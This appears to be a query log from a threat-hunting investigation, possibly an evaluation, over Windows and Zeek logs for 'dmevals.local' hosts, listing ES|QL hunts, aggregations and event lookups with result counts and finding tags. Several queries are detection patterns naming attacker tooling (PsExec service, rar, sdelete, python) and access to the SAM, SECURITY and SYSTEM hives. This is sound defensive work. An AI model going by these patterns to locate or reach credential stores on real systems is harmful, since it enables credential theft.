| q-a3a22a9e7c | pivot seed | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688 AND host.name:\"nashua.dmevals.local\"", "time_from": "2020-05-02T02:54:29.430000+00:00", "time_to": "2020-05-02T03:26:39+00:00", "size": 100, "sub_field": "process.parent… | 63 |  |
| q-2d9c6e234b | pivot seed | aggregate | {"dataset": "windows.powershell", "field": "event.code", "query": "host.name:\"nashua.dmevals.local\"", "time_from": "2020-05-02T02:54:29.430000+00:00", "time_to": "2020-05-02T03:26:39+00:00", "size": 100, "sub_field": null} | 192 |  |
| q-2fabfc6531 | pivot seed | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND host.name:\"scranton.dmevals.local\"", "time_from": "2020-05-02T02:40:56.157000+00:00", "time_to": "2020-05-02T03:25:23.154000+00:00", "size": 100, "sub_field": "process.pa… | 358 |  |
| q-b2ebbf59d4 | pivot seed | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND host.name:\"scranton.dmevals.local\"", "time_from": "2020-05-02T02:40:56.157000+00:00", "time_to": "2020-05-02T03:25:23.154000+00:00", "size": 100, "sub_field": "process.executable… | 1272 |  |
| q-7a4bbebf3a | pivot seed | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688 AND host.name:\"scranton.dmevals.local\"", "time_from": "2020-05-02T02:40:56.157000+00:00", "time_to": "2020-05-02T03:25:23.154000+00:00", "size": 100, "sub_field": "proce… | 369 |  |
| q-641db8a548 | pivot seed | aggregate | {"dataset": "windows.powershell", "field": "event.code", "query": "host.name:\"scranton.dmevals.local\"", "time_from": "2020-05-02T02:40:56.157000+00:00", "time_to": "2020-05-02T03:25:23.154000+00:00", "size": 100, "sub_field": null} | 8602 |  |
| q-1c310d4504 | pivot step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*\\\\temp\\\\*\" OR TO_LOWER(file.path) LIKE \"*\\\\programdata\\\\*\" OR TO_LOWER(file.path) LIKE \"*\\\\users\\\\public\\\\*\" OR T… | ERROR |  |
| q-21ec882b1b | pivot step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.executable) LIKE \"*\\\\temp\\\\*\" OR TO_LOWER(process.executable) LIKE \"*\\\\programdata\\\\*\" OR TO_LOWER(process.executable) LIKE \"*\\\\u… | ERROR |  |
| q-00cf6b062e | pivot step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*\\\\\\\\temp\\\\\\\\*\" OR TO_LOWER(file.path) LIKE \"*\\\\\\\\programdata\\\\\\\\*\" OR TO_LOWER(file.path) LIKE \"*\\\\\\\\users\\… | 51 | F53 |
| q-2d14e92f28 | pivot step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.executable) LIKE \"*\\\\\\\\temp\\\\\\\\*\" OR TO_LOWER(process.executable) LIKE \"*\\\\\\\\programdata\\\\\\\\*\" OR TO_LOWER(process.executabl… | 10 | F54, F55 |
| q-bd159cf715 | pivot step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE host.name == \"nashua.dmevals.local\" AND event.code == \"4104\" \| KEEP @timestamp, host.name, user.name, powershell.script_block_text, _id, _index \| SORT @timestamp ASC"} | ERROR |  |
| q-05512340a5 | pivot step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*\\\\\\\\temp\\\\\\\\*\" OR TO_LOWER(file.path) LIKE \"*\\\\\\\\programdata\\\\\\\\*\" OR TO_LOWER(file.path) LIKE \"*\\\\\\\\users\\… | 5 |  |
| q-c54c5f52bb | pivot step 4 | get_fields | {"dataset": "windows.powershell", "prefix": ""} | None |  |
| q-0817ee5ff3 | pivot step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND host.name == \"nashua.dmevals.local\" AND (TO_LOWER(process.command_line) LIKE \"*python*\" OR TO_LOWER(process.command_line) LIKE \"*rar*\" OR TO_LOWER(process.c… | 8 | F55 |
| q-a6bd1fd9b7 | pivot step 5 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE host.name == \"nashua.dmevals.local\" AND event.code == \"4104\" \| KEEP @timestamp, user.name, win.ScriptBlockText, _id, _index \| SORT @timestamp ASC"} | 11 |  |
| q-84b7eafc6c | pivot step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE host.name == \"nashua.dmevals.local\" AND event.code == \"3\" AND process.executable LIKE \"*python*\" \| KEEP @timestamp, user.name, process.executable, destination.ip, destination.port… | ERROR |  |
| q-a82d1ecab6 | pivot step 6 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZLhp5i"} | None | F53 |
| q-b8d991409a | pivot step 6 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE host.name == \"nashua.dmevals.local\" AND event.code == \"3\" AND process.executable LIKE \"*python*\" \| KEEP @timestamp, user.name, process.executable, destination.ip, destination.port… | 348 | F55 |
| q-7c2ca18dc0 | pivot step 7 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4663\" AND (TO_LOWER(win.ObjectName) LIKE \"*\\\\\\\\sam\" OR TO_LOWER(win.ObjectName) LIKE \"*\\\\\\\\security\" OR TO_LOWER(win.ObjectName) LIKE \"*\\\\\\\\system\" O… | 6 | F56 |
| q-7d26df314e | pivot step 7 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND host.name == \"scranton.dmevals.local\" AND (file.path LIKE \"*Draft.Zip*\" OR file.path LIKE \"*OfficeSupplies*\" OR file.path LIKE \"*working.zip*\" OR file.pa… | 3 |  |
| q-d8a540e34a | pivot step 8 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE host.name == \"nashua.dmevals.local\" AND event.code == \"11\" AND (process.executable LIKE \"*python*\" OR process.executable LIKE \"*Rar*\" OR process.executable LIKE \"*PSEXESVC*\") \… | 22 | F55 |
| q-6e1ca61886 | pivot step 8 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE host.name == \"nashua.dmevals.local\" AND event.code == \"4688\" AND (process.executable LIKE \"*python*\" OR process.executable LIKE \"*Rar*\" OR process.executable LIKE \"*sdelete*\"… | 10 |  |
| q-e5ff786f6e | pivot verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZLhp5i"} | None |  |
| q-54f5a77941 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPCxFs-"} | None |  |
| q-c1c8df5fba | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTPA5kN"} | None |  |
| q-d2730647f7 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPO_TIA"} | None |  |
| q-303c60d8d6 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPJ5Bh7"} | None |  |
| q-d2e9536211 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGQmt"} | None |  |
| q-6ea34f65f3 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPK66ha"} | None |  |
| q-91bdcc87bd | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPK6qjB"} | None |  |
| q-f61e81834d | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPK6qid"} | None |  |
| q-9e6008ee1c | pivot verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKBk"} | None |  |
| q-1784830007 | pivot verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKBk"} | None |  |
| q-53fb55cd3b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-b4fdffe375 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-081bec6990 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-a260d29196 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-79328a9827 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKBk"} | None |  |
| q-2d04a70a45 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrYMQT"} | None |  |
| q-9f5a01788a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-c5face34bc | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOqAA"} | None |  |
| q-75d2de7d17 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTiZblD"} | None |  |
| q-ee2818c987 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaEO1dd"} | None |  |
| q-f6cf0965c8 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaEO1dg"} | None |  |
| q-323b308175 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ6CoYO"} | None |  |
| q-2aa861d735 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPM8kte"} | None |  |
| q-1f4a5c7fd6 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPM8kte"} | None |  |
| q-0f2005c716 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVt4o2y"} | None |  |
| q-a8e5c4b9fc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPE0PdZ"} | None |  |
| q-01f8512d3d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOuYQdN"} | None |  |
| q-34899ce0e0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9qRCx"} | None |  |
| q-bf72c454de | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOlQHBV"} | None |  |
| q-f77edaded4 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRk1CS"} | None |  |
| q-f48a3b7076 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRk1C1"} | None |  |
| q-2da3d82977 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRk1CS"} | None |  |
| q-34a432b3c9 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRk1CS"} | None |  |
| q-bd407ba7cc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-0f67541a9a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-ca29274ee9 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-4c10ed431c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-3f172e304e | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRlFBP"} | None |  |
| q-ef0fa00d7e | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRk1Cy"} | None |  |
| q-404b1adaf9 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRlFD4"} | None |  |
| q-d513ec9836 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FNc"} | None |  |
| q-9db99d75cf | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FNc"} | None |  |
| q-649b9e091a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-c9531ae21e | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-975c9e2a07 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-ce1da6fa00 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-4dd6a90e5f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-630cc03262 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVr3Lv_"} | None |  |
| q-94683b1711 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-a9bb0fb80b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-acddffe5da | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev9J"} | None |  |
| q-23632b336a | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FNc"} | None |  |
| q-7b475c3054 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FNc"} | None |  |
| q-001833fb78 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPDyDoS"} | None |  |
| q-2c9347bbcc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO_tniJ"} | None |  |
| q-85216e9102 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOYDnci"} | None |  |
| q-bd34817b1b | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRllBR"} | None |  |
| q-b75776dc40 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrYMQT"} | None |  |
| q-4129bb1559 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-373795d7f1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-90dc3d16ab | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-5136621967 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTWI7pZ"} | None |  |
| q-4f1c3e2066 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTmcl_4"} | None |  |
| q-e27c5f59a0 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgH"} | None |  |
| q-09cd739dcc | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgH"} | None |  |
| q-6fef2c9b5f | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgN"} | None |  |
| q-cb82f67e5b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaFQQt-"} | None |  |
| q-f71cdd11b4 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaFQQt-"} | None |  |
| q-1eca08e3e2 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKDB"} | None |  |
| q-9d6458590f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTqgghU"} | None |  |
| q-9bac959b0d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTqgghU"} | None |  |
| q-99877d6c3e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOkOj38"} | None |  |
| q-7582414edc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOlP3A4"} | None |  |
| q-ddac804ede | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOYDnci"} | None |  |
| q-f9eb615a73 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9re0C"} | None |  |
| q-c84b5ab85e | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn01Pa"} | None |  |
| q-2031d3f4e3 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZJhF-L"} | None |  |
| q-65c84a8d48 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-d02f852470 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-6584effcf5 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTWI7pZ"} | None |  |
| q-83b81e87e4 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOZEq4k"} | None |  |
| q-0a84554e87 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-9d9c54be9d | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-7696b4a365 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-b549727b63 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEF9"} | None |  |
| q-6a6fd3fcdc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEF9"} | None |  |
| q-c7ab8092ea | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-a3a4e2b269 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-99b2aff40e | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-963203999b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV3-aUm"} | None |  |
| q-9256ab5b8e | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV3-aUm"} | None |  |
| q-baf16c7428 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7E__C"} | None |  |
| q-edbe96f494 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItKT-1UI"} | None |  |
| q-b93a03d6c8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9rO3W"} | None |  |
| q-3d118588f0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-636a133f37 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-fda9e04234 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-8aea5c601c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-2ca3f2d9eb | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-afd7aa5123 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVq1T6-"} | None |  |
| q-8b550b6c04 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVq1T6-"} | None |  |
| q-8c1b67462b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOqAA"} | None |  |
| q-9b16f51a18 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_JuD"} | None |  |
| q-de379644d6 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-a2cf960bf7 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-96218104f1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_JuD"} | None |  |
| q-00f4bcd8f6 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_JuD"} | None |  |
| q-9b0fb487a8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_JuD"} | None |  |
| q-13fceed2d3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPEz_fX"} | None |  |
| q-30ec14394f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPEz_fX"} | None |  |
| q-dcab0065a8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO7oWgL"} | None |  |
| q-8b10a6dfcd | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVt5I2Y"} | None |  |
| q-2207a1f120 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVt5I2Y"} | None |  |
| q-aa41702b51 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaKXhpQ"} | None |  |
| q-e476d8fb92 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaKXhpQ"} | None |  |
| q-ed6fd4c687 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaKXhpQ"} | None |  |
| q-efdf2f29e5 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaKXhpQ"} | None |  |
| q-c03fa0db27 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaKXhpQ"} | None |  |
| q-99b99046f6 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaKXhpQ"} | None |  |
| q-b6d92ff592 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ6CoZN"} | None |  |
| q-138cea5c25 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-e0028d3891 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-64ea90e197 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-897fa0f131 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrYMQT"} | None |  |
| q-3658c7c163 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGQmt"} | None |  |
| q-e51fef86aa | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGQmt"} | None |  |
| q-511e56eca4 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTqgghU"} | None |  |
| q-b11cd21c05 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog4"} | None |  |
| q-7d1d361e78 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYj4"} | None |  |
| q-25bae1a2bc | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog4"} | None |  |
| q-0cfc406b01 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog4"} | None |  |
| q-824342f33d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQD9ggh"} | None |  |
| q-bf3487ba82 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-712a8e7dbd | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-7d943d8afc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-56fc9b8a72 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-8aa78046c7 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_psP"} | None |  |
| q-cb3d807ac3 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZWqNA3"} | None |  |
| q-bef9ce6c48 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-222318bd89 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-ccf9c9c2ac | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-d59ec2b00b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8FbW6"} | None |  |
| q-02e988b98d | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV3-aUM"} | None |  |
| q-08648a7852 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ef_w"} | None |  |
| q-4af1f68433 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8FbW6"} | None |  |
